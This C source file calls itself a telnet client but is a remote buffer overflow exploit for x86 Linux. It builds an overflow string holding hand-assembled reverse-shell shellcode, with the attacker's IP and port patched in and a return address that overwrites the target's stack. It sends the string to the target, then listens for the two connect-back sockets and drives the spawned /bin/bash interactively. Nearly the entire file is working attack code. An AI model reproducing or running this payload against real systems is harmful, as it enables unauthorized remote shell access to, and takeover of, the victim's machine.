/*(c)Gildo
this is a little telnet client that listen as a server for 
the beginning of the connection, it will send commands
to the remote computer and will display the answers from it.
socket sock_in will send input to remote computer, while
socket sock_out will receve output and error.
*/


#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <unistd.h>  //close
#include <stdlib.h>  //malloc
#include <string.h>  //strncpy
#include <errno.h>


#define PORT 18002
#define BUF_SIZE 1024

int do_listen(int *psock_listen,int port);
char *do_string(unsigned int ip,unsigned int port,int addr);
int do_accept(int sock_listen);

int do_exploit(int sock,int ip,int port,int addr)  //this is the function to call from outside, as a wrapper that do all
{
  char *shell_code;
  int sock_listen;
  do_listen(&sock_listen,port);  //listen on port and port+1, where the exploit shell will transfer stdin and stdout
  shell_code=do_string((unsigned int)ip,(unsigned int)port,addr);
  if(shell_code==NULL){printf("error, cannot complete the explloit, sorry\n");close(sock_listen);exit(-1);}
  send(sock,shell_code,strlen(shell_code)+1,0);  //send the exploiting string
  do_accept(sock_listen);  //now accept the 2 connections of the shell spawn

  return(0);
} 
  

int do_listen(int *psock_listen,int port)
{
  struct sockaddr_in addr_my;
  int len;

  *psock_listen=socket(AF_INET,SOCK_STREAM,0);
  addr_my.sin_family=AF_INET;
  addr_my.sin_port=htons((port!=0)?port:PORT);
  addr_my.sin_addr.s_addr=INADDR_ANY;
  
  bind(*psock_listen,(struct sockaddr*)&addr_my,sizeof(addr_my));  //bind
  listen(*psock_listen,2); 
  
  len=sizeof(addr_my);
  if(!getsockname(*psock_listen,(struct sockaddr*)&addr_my,(socklen_t*)&len))
    printf("listening on port %u=0x%x\n",ntohs(addr_my.sin_port),
           ntohs(addr_my.sin_port));

  //do_string and sned_exploit///////////////////////////////////////////////////////
  return(0);
}

int do_accept(int sock_listen)
{
  int ret,len;
  struct sockaddr_in addr_client,addr_my;
  int sock_out,sock_in;
  char receved[BUF_SIZE];
  char sent[BUF_SIZE];

  len=sizeof(addr_client);
  sock_out=accept(sock_listen,(struct sockaddr*)&addr_client,(socklen_t*)&len); //connect stdout sock
  printf("accepted connection from %u.%u.%u.%u:%u  [stdout/stderr]\n",
             (ntohl(addr_client.sin_addr.s_addr)>>24) & 0xff,
             (ntohl(addr_client.sin_addr.s_addr)>>16)&0xff,
             (ntohl(addr_client.sin_addr.s_addr)>>8)&0xff,
             (ntohl(addr_client.sin_addr.s_addr))&0xff,
             ntohs(addr_client.sin_port));

//  len=sizeof(addr_client);
  sock_in=accept(sock_listen,(struct sockaddr*)&addr_client,(socklen_t*)&len); //connect stdin sock
  if(sock_in==-1 || sock_out==-1)goto end;
  printf("accepted connection from %u.%u.%u.%u:%u  [stdin]\n",
             (ntohl(addr_client.sin_addr.s_addr)>>24) & 0xff,
             (ntohl(addr_client.sin_addr.s_addr)>>16)&0xff,
             (ntohl(addr_client.sin_addr.s_addr)>>8)&0xff,
             (ntohl(addr_client.sin_addr.s_addr))&0xff,
             ntohs(addr_client.sin_port));
  printf("WORK DONE\nGildo hopes you'll enjoy\n");  

  receved[BUF_SIZE-1]=0;
  sent[0]=0;
  while(1)  //use "exit\n" to exit *****this is the telnet interface
  {
    ret=send(sock_in,sent,strlen(sent),MSG_DONTWAIT);
    if(ret==-1)perror("");

    sleep(1);
    
    ret=recv(sock_out,receved,BUF_SIZE-1,MSG_DONTWAIT);
    if(ret==0)goto end;
    if(ret!=-1)
    {
      do
      {
        receved[ret]='\0';
        printf("%s",receved);
      }while((ret=recv(sock_out,receved,BUF_SIZE-1,MSG_DONTWAIT))>0);
      printf("\n");
    }

    ret=read(0,sent,BUF_SIZE-2);
    if(ret<0)goto end;
    sent[ret+1]='\n';
    sent[ret]='\0';
  }

end:
  close(sock_listen);
  close(sock_out);
  close(sock_in);
  exit(0);
  return 0;
}



extern const unsigned char code[];

#define BUFFER_SIZE 260
#define RET (BUFFER_SIZE+4)
int min(int a,int b){return (b<a)?b:a;}



/* 
   I'll alloc a string BUFFER_SIZE+9 bytes long,
   if BUFFER_SIZE>strlen(code), else can be done a jmp 
   and do the same,consider if the address of buffer has
   a zero too
   this is my exploit!!!ahah
*/
char *do_string(unsigned int ip,unsigned int port,int addr)
{
  unsigned char *c,*d;
  int len;

  if(BUFFER_SIZE<=strlen((const char*)code))return NULL; //no space for the code (I can add 
  //the feature for doing the exploit in another way (using a jmp into the code))
  len=BUFFER_SIZE+9;
  c=(unsigned char*)malloc(len);  
  printf("allocated %d bytes\nc is 0%x\n",len,c);
  printf("code length = %d bytes\n",strlen((const char*)code));
  //pad with a !=0 
  for(d=c;d<c+len;d++)
    d[0]=0xB;
  d=c;
  if((addr&0xff)==0) //the address must be increased by one
  {
    printf("worning address is 0x%x\n",addr);
    d[0]=0x90;  //NOP
    addr++;
    d++;
  }
  strncpy((char*)d,(const char*)code,strlen((const char*)code)); //I don't want '\0' here eheh
  
  d[74]=(unsigned char) (ip>>24);
  d[75]=(unsigned char) (ip>>16);
  d[76]=(unsigned char) (ip>>8);
  d[77]=(unsigned char) (ip);
  //note: *((int*)&c[52])=ip; no, becouseIP is stored as bigendian, not little endian
  if(port!=0) //port=0 will leave the default
  { 
    d[69]=(unsigned char) (port>>8);
    d[70]=(unsigned char) (port);
  }
  printf("d[72]=%x d[73]=%x\n",(char)d[72],(char)d[73]);
  printf("IP: %u.%u.%u.%u\n",c[76],c[77],c[78],c[79]);
  printf("port: 0x%x%x\n",c[71],c[72]);
  *((int*)&c[RET])=addr;     //the RET address (RET is BUFFER_SIZE+4)
  c[RET+4]=0;               //NULL terminated string
  return (char*)c;
}


  //PORT actual is 0x5246 to change!!**********************************
  //0x66,0xc7,0x45,0xea,0x46,0x52, /*804809f:movw $0x5246,0xffffffea(%ebp)*/
  //IP actual is 127.3.3.1 to change!!!******************************
  //0xc7,0x45,0xec,0x7f,0x03,0x03,0x01,/*80480a5:movl $0x100007f,0xffffffec(%ebp) */

const unsigned char code[] =
{
  0x31,0xc0,                   /*  8048074: xor    %eax,%eax     */
  0xb0,0xdc,                   /*  8048076: mov    $0xdc,%al     */
  0x29,0xc4,                   /*  8048078: sub    %eax,%esp     */
  0x89,0xe5,                   /*  804807a: mov    %esp,%ebp     */
  0xb0,0x34,                   /*  804807c: mov    $0x34,%al     */
  0x29,0xc4,                   /*  804807e: sub    %eax,%esp     */

/* 0000000008048080 <fork>: */
  0x31,0xdb,                   /*  8048080: xor    %ebx,%ebx     */
  0xb0,0x02,                   /*  8048082: mov    $0x2,%al      */
  0xcd,0x80,                   /*  8048084: int    $0x80         */
  0x39,0xc3,                   /*  8048086: cmp    %eax,%ebx     */
  0x74,0x05,                   /*  8048088: je    804808f <end_fork> */
  0x89,0xd8,                   /*  804808a: mov    %ebx,%eax     */
  0x40,                        /*  804808c: inc    %eax          */
  0xcd,0x80,                   /*  804808d: int    $0x80         */

/* 000000000804808f <end_fork>: */
  0x31,0xc0,                   /*  804808f: xor    %eax,%eax     */
  0x50,                        /*  8048091: push   %eax          */
  0x6a,0x01,                   /*  8048092: push   $0x1          */
  0x6a,0x02,                   /*  8048094: push   $0x2          */
  0x29,0xdb,                   /*  8048096: sub    %ebx,%ebx     */
  0x43,                        /*  8048098: inc    %ebx          */
  0x89,0xe1,                   /*  8048099: mov    %esp,%ecx     */
  0x31,0xc0,                   /*  804809b: xor    %eax,%eax     */
  0xb0,0x66,                   /*  804809d: mov    $0x66,%al     */
  0xcd,0x80,                   /*  804809f: int    $0x80         */
  0x89,0x45,0xfc,              /*  80480a1: mov    %eax,0xfffffffc(%ebp) */
  0x31,0xc0,                   /*  80480a4: xor    %eax,%eax     */
  0xb0,0x66,                   /*  80480a6: mov    $0x66,%al     */
  0xcd,0x80,                   /*  80480a8: int    $0x80         */
  0x89,0x45,0xf8,              /*  80480aa: mov    %eax,0xfffffff8(%ebp) */
  0x31,0xc0,                   /*  80480ad: xor    %eax,%eax     */
  0xb0,0x02,                   /*  80480af: mov    $0x2,%al      */
  0x66,0x89,0x45,0xe8,         /*  80480b1: mov    %ax,0xffffffe8(%ebp) */
  //PORT actual is 0x5246 to change!!**********************************
  0x66,0xc7,0x45,0xea,0x46,0x52, /*804809f:movw $0x5246,0xffffffea(%ebp)*/
  //IP actual is 127.3.3.1 to change!!!******************************
  0xc7,0x45,0xec,0x7f,0x03,0x03,0x01,/*80480a5:movl $0x100007f,0xffffffec(%ebp) */
  0x8b,0x45,0xf8,              /*  80480c2: mov    0xfffffff8(%ebp),%eax */
  0x89,0x45,0xdc,              /*  80480c5: mov    %eax,0xffffffdc(%ebp) */
  0x8d,0x45,0xe8,              /*  80480c8: lea    0xffffffe8(%ebp),%eax */
  0x89,0x45,0xe0,              /*  80480cb: mov    %eax,0xffffffe0(%ebp) */
  0x31,0xc0,                   /*  80480ce: xor    %eax,%eax     */
  0xb0,0x10,                   /*  80480d0: mov    $0x10,%al     */
  0x89,0x45,0xe4,              /*  80480d2: mov    %eax,0xffffffe4(%ebp) */
  0x31,0xc0,                   /*  80480d5: xor    %eax,%eax     */
  0x89,0xc3,                   /*  80480d7: mov    %eax,%ebx     */
  0x8d,0x4d,0xdc,              /*  80480d9: lea    0xffffffdc(%ebp),%ecx */
  0xb3,0x03,                   /*  80480dc: mov    $0x3,%bl      */
  0xb0,0x66,                   /*  80480de: mov    $0x66,%al     */
  0xcd,0x80,                   /*  80480e0: int    $0x80         */
  0x8b,0x45,0xfc,              /*  80480e2: mov    0xfffffffc(%ebp),%eax */
  0x89,0x45,0xdc,              /*  80480e5: mov    %eax,0xffffffdc(%ebp) */
  0x31,0xc0,                   /*  80480e8: xor    %eax,%eax     */
  0x89,0xc3,                   /*  80480ea: mov    %eax,%ebx     */
  0x8d,0x4d,0xdc,              /*  80480ec: lea    0xffffffdc(%ebp),%ecx */
  0xb3,0x03,                   /*  80480ef: mov    $0x3,%bl      */
  0xb0,0x66,                   /*  80480f1: mov    $0x66,%al     */
  0xcd,0x80,                   /*  80480f3: int    $0x80         */
  0x31,0xc0,                   /*  80480f5: xor    %eax,%eax     */
  0x31,0xdb,                   /*  80480f7: xor    %ebx,%ebx     */
  0xb0,0x06,                   /*  80480f9: mov    $0x6,%al      */
  0xcd,0x80,                   /*  80480fb: int    $0x80         */
  0x31,0xc0,                   /*  80480fd: xor    %eax,%eax     */
  0x8b,0x5d,0xfc,              /*  80480ff: mov    0xfffffffc(%ebp),%ebx */
  0x89,0xc1,                   /*  8048102: mov    %eax,%ecx     */
  0x89,0xc2,                   /*  8048104: mov    %eax,%edx     */
  0xb0,0x37,                   /*  8048106: mov    $0x37,%al     */
  0xcd,0x80,                   /*  8048108: int    $0x80         */
  0x31,0xc0,                   /*  804810a: xor    %eax,%eax     */
  0x31,0xdb,                   /*  804810c: xor    %ebx,%ebx     */
  0x43,                        /*  804810e: inc    %ebx          */
  0xb0,0x06,                   /*  804810f: mov    $0x6,%al      */
  0xcd,0x80,                   /*  8048111: int    $0x80         */
  0x31,0xc0,                   /*  8048113: xor    %eax,%eax     */
  0x8b,0x5d,0xf8,              /*  8048115: mov    0xfffffff8(%ebp),%ebx */
  0x89,0xc1,                   /*  8048118: mov    %eax,%ecx     */
  0x89,0xc2,                   /*  804811a: mov    %eax,%edx     */
  0xb0,0x37,                   /*  804811c: mov    $0x37,%al     */
  0xcd,0x80,                   /*  804811e: int    $0x80         */
  0x31,0xc0,                   /*  8048120: xor    %eax,%eax     */
  0x31,0xdb,                   /*  8048122: xor    %ebx,%ebx     */
  0x43,                        /*  8048124: inc    %ebx          */
  0x43,                        /*  8048125: inc    %ebx          */
  0xb0,0x06,                   /*  8048126: mov    $0x6,%al      */
  0xcd,0x80,                   /*  8048128: int    $0x80         */
  0x31,0xc0,                   /*  804812a: xor    %eax,%eax     */
  0x8b,0x5d,0xf8,              /*  804812c: mov    0xfffffff8(%ebp),%ebx */
  0x89,0xc1,                   /*  804812f: mov    %eax,%ecx     */
  0x89,0xc2,                   /*  8048131: mov    %eax,%edx     */
  0xb0,0x37,                   /*  8048133: mov    $0x37,%al     */
  0xcd,0x80,                   /*  8048135: int    $0x80         */

/* 0000000008048137 <execve>: */
  0x31,0xc0,                   /*  8048137: xor    %eax,%eax     */
  0xb0,0x68,                   /*  8048139: mov    $0x68,%al     */
  0x50,                        /*  804813b: push   %eax          */
  0x68,0x2f,0x62,0x61,0x73,    /*  804813c: push   $0x7361622f   */
  0x68,0x2f,0x62,0x69,0x6e,    /*  8048141: push   $0x6e69622f   */
  0x89,0xe3,                   /*  8048146: mov    %esp,%ebx     */
  0x31,0xc0,                   /*  8048148: xor    %eax,%eax     */
  0x50,                        /*  804814a: push   %eax          */
  0x53,                        /*  804814b: push   %ebx          */
  0x89,0xe1,                   /*  804814c: mov    %esp,%ecx     */
  0x8d,0x54,0x24,0x04,         /*  804814e: lea    0x4(%esp,1),%edx */
  0xb0,0x0b,                   /*  8048152: mov    $0xb,%al      */
  0xcd,0x80,                   /*  8048154: int    $0x80         */

/* 0000000008048156 <quit>: */
  0x31,0xdb,                   /*  8048156: xor    %ebx,%ebx     */
  0x89,0xd8,                   /*  8048158: mov    %ebx,%eax     */
  0x40,                        /*  804815a: inc    %eax          */
  0xcd,0x80,                   /*  804815b: int    $0x80         */
  0x8d,0x76,0x00               /*  804815d: lea    0x0(%esi),%esi */
};

